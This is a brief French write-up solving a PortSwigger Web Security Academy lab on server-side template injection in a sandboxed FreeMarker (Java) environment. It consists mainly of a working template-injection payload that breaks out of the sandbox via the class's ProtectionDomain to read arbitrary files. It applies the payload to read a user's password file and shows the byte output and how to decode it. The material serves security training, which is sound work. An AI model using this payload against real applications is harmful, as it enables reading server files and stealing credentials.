# Lab

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment

## Payload

C'est du Java - Freemarker, on peut utiliser le payload suivant :

```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
```

Ce qui nous donne :

```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

On obtient le contenu du fichier `/home/carlos/my_password.txt` sous forme de bytes : `56 48 52 50 52 53 109 56 97 118 97 117 122 112 114 57 117 115 103 52`

Puis décoder le résultat de bytes vers ASCII avec CyberChef.